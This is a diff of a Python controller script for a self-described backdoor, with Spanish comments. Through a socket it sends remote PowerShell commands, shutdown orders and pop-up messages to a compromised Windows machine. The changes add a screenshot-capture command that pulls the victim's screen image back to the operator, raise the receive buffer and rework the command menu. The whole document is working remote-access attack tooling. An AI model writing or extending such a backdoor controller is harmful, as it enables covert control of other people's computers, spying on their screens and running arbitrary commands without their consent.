@@ -37,7 +37,7 @@ args.add_argument('-IP','--ip',
 arg = args.parse_args()
 
 n = 0 # valor que percibe la primera conexion
-timeout = 5
+timeout = 3
 print('\033[0;35m' + logo + '\033[0m')
 
 if platform.system() == 'Linux':
@@ -57,41 +57,59 @@ comandos basicos:
 [\033[0;32m1\033[0m] apagar equipo
 [\033[0;32m2\033[0m] enviar mensaje
 [\033[0;32mq\033[0m] salir
-
+[\033[0;32mss\033[0m] capturar pantalla
           ''')
 
 
 def shell(socket):
 
     'funcion que envia al backdoor los comandos de la consola'
-
+    buffer = 102_400
     try:
         menu()
         entrada = str(input('[#] comando >> '))
-        if entrada == 'q':
-            print('\n\033[0;32m[*] saliendo\033[0m\n')
-            exit(0)
-        elif entrada == '0':
-            os.system(borrar)
+        match entrada:
+            case 'q':
+                print('\n\033[0;32m[*] saliendo\033[0m\n')
+                exit(0)
+            case '0':
+                os.system(borrar)
 
-        elif entrada == '1':
+            case '1':
 
-                socket.send(b'shutdown /s')
+                    socket.send(b'shutdown /s')
 
-        elif entrada == '2':
+            case '2':
+                
+                socket.send(f'msg * {str(input('mensaje> '))}'.encode())
+                os.system(borrar)
+            case 'ss':
+                img_nombre = 'screen.jpg'
+                socket.send('ss'.encode()) # envio la señal para que el backdoor sepa que debe enviar ss
+                tamaño_original = int.from_bytes(socket.recv(8))
+                data = bytearray()
+
+                while len(data) < tamaño_original:
+                    restante = tamaño_original - len(data) # se calcula el buffer restante, debe coincidir
+                    datos = socket.recv(restante) # datos obtenidos en cada momento
+                    if not datos: # si datos = b''
+                        break
+                    data.extend(datos) # agrego lo nuevos datos al bytearray
+                if tamaño_original == len(data):
+                    with open(img_nombre,'wb') as img_arch:
+                        img_arch.write(data) # escribo el bytearray que contiene todos los datos
+                    print(f'\n\033[0;32mimagen obtenida : {img_nombre}\033[0m\n')
+                else: print('\n\033[0;31mno se pudo obtener la imagen\033[0m\n')
+                    
+            case _:
+                socket.send(f'powershell -command {entrada}'.encode()) # enviar comando de powershell por cmd
+                salida = socket.recv(buffer).decode() # salida del comando (lo envia el bdoor)
+                if salida != None:
+                    print(salida)
+                else:
+                    print('\n\033[0;31mno hubo respuesta\033[0m\n')
+                return salida
             
-            socket.send(f'msg * {str(input('mensaje> '))}'.encode())
-            os.system(borrar)
-        
-
-        else:
-            socket.send(f'powershell -command {entrada}'.encode()) # enviar comando de powershell por cmd
-            salida = socket.recv(1024).decode() # salida del comando (lo envia el bdoor)
-            if salida != None:
-                print(salida)
-            else:
-                print('\n\033[0;31mno hubo respuesta\033[0m\n')
-            return salida
     except KeyboardInterrupt:
         salir()
 
@@ -121,10 +139,7 @@ def conexion(contador):
                 time.sleep(timeout)
                 
                 os.system(borrar)
-            except TypeError:
-                os.system('python cliente.py --help')
-                input('\n[+] presionar ENTER para salir\n')
-                exit(0)
+            
 
             finally:
                 contador= 1
